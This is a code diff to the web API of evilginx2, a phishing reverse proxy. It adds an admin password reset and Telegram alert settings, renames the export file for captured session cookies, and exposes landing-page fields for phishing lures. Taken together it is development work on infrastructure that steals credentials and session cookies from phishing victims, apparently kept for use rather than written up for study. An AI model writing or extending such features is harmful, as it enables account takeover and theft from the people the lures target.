@@ -16,6 +16,7 @@ import (
 	"github.com/kgretzky/evilginx2/database"
 	gp_models "github.com/kgretzky/evilginx2/gophish/models"
 	"github.com/kgretzky/evilginx2/log"
+	"golang.org/x/crypto/bcrypt"
 )
 
 type WebAPI struct {
@@ -30,13 +31,47 @@ func (w *WebAPI) GetAdminPass() string {
 	return w.adminPass
 }
 
-func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver, hp *HttpProxy) *WebAPI {
+func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver, hp *HttpProxy, adminPassword string) *WebAPI {
 	return &WebAPI{
-		db:  db,
-		cfg: cfg,
-		ns:  ns,
-		hp:  hp,
+		db:        db,
+		cfg:       cfg,
+		ns:        ns,
+		hp:        hp,
+		adminPass: adminPassword,
 	}
+}
+
+func (w *WebAPI) ResetAdminPassword(newPassword string) error {
+	if newPassword == "" {
+		return fmt.Errorf("new password cannot be empty")
+	}
+
+	user, err := w.db.GetUserByUsername("admin")
+	if err != nil {
+		// Create the admin user if it does not exist yet.
+		hash, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
+		if err != nil {
+			return err
+		}
+		_, err = w.db.CreateUser("admin", string(hash), "admin")
+		if err != nil {
+			return err
+		}
+		w.adminPass = newPassword
+		return nil
+	}
+
+	hash, err := bcrypt.GenerateFromPassword([]byte(newPassword), bcrypt.DefaultCost)
+	if err != nil {
+		return err
+	}
+	user.PasswordHash = string(hash)
+	user.MustChangePassword = false
+	if err := w.db.UpdateUser(user.Id, user); err != nil {
+		return err
+	}
+	w.adminPass = newPassword
+	return nil
 }
 
 // writeJSON sets Content-Type, writes the given status code, and encodes v as
@@ -248,7 +283,7 @@ func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request
 	}
 
 	rw.Header().Set("Content-Type", "application/json")
-	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=cookies_%d.json", id))
+	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=cookies_session%d.json", id))
 	json.NewEncoder(rw).Encode(cookieArray)
 }
 
@@ -848,24 +883,26 @@ func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
 				}
 			}
 			lures = append(lures, map[string]interface{}{
-				"index":           i,
-				"id":              l.Id,
-				"phishlet":        l.Phishlet,
-				"hostname":        hostname,
-				"path":            l.Path,
-			"redirect_url":           l.RedirectUrl,
-			"redirector":             l.Redirector,
-			"post_redirector":        l.PostRedirector,
-			"ua_filter":              l.UserAgentFilter,
-			"info":                   l.Info,
-			"og_title":               l.OgTitle,
-			"og_desc":                l.OgDescription,
-			"og_image":               l.OgImageUrl,
-			"og_url":                 l.OgUrl,
-			"paused_until":           l.PausedUntil,
-			"use_external_redirect":  l.UseExternalRedirect,
-			"external_redirect_url":  l.ExternalRedirectUrl,
-		})
+				"index":                 i,
+				"id":                    l.Id,
+				"phishlet":              l.Phishlet,
+				"hostname":              hostname,
+				"path":                  l.Path,
+				"redirect_url":          l.RedirectUrl,
+				"redirector":            l.Redirector,
+				"post_redirector":       l.PostRedirector,
+				"ua_filter":             l.UserAgentFilter,
+				"info":                  l.Info,
+				"og_title":              l.OgTitle,
+				"og_desc":               l.OgDescription,
+				"og_image":              l.OgImageUrl,
+				"og_url":                l.OgUrl,
+				"paused_until":          l.PausedUntil,
+				"landing_page":          l.LandingPage,
+				"landing_config":        l.LandingConfig,
+				"use_external_redirect": l.UseExternalRedirect,
+				"external_redirect_url": l.ExternalRedirectUrl,
+			})
 		}
 	}
 
@@ -1395,9 +1432,10 @@ func (w *WebAPI) handleAudit(rw http.ResponseWriter, req *http.Request) {
 
 func (w *WebAPI) handleGetTelegram(rw http.ResponseWriter, req *http.Request) {
 	rw.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(rw).Encode(map[string]string{
+	json.NewEncoder(rw).Encode(map[string]interface{}{
 		"chatId":   w.cfg.GetTelegramChatID(),
 		"botToken": w.cfg.GetTelegramBotToken(),
+		"enabled":  w.cfg.GetTelegramEnabled(),
 	})
 }
 
@@ -1410,6 +1448,7 @@ func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
 	var payload struct {
 		ChatId   string `json:"chatId"`
 		BotToken string `json:"botToken"`
+		Enabled  bool   `json:"enabled"`
 	}
 	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
 		http.Error(rw, "Invalid JSON payload", http.StatusBadRequest)
@@ -1418,7 +1457,7 @@ func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
 
 	w.cfg.SetTelegramChatID(payload.ChatId)
 	w.cfg.SetTelegramBotToken(payload.BotToken)
-	w.cfg.SetTelegramEnabled(true)
+	w.cfg.SetTelegramEnabled(payload.Enabled)
 
 	if w.hp != nil {
 		w.hp.ReloadTelegramConfig()
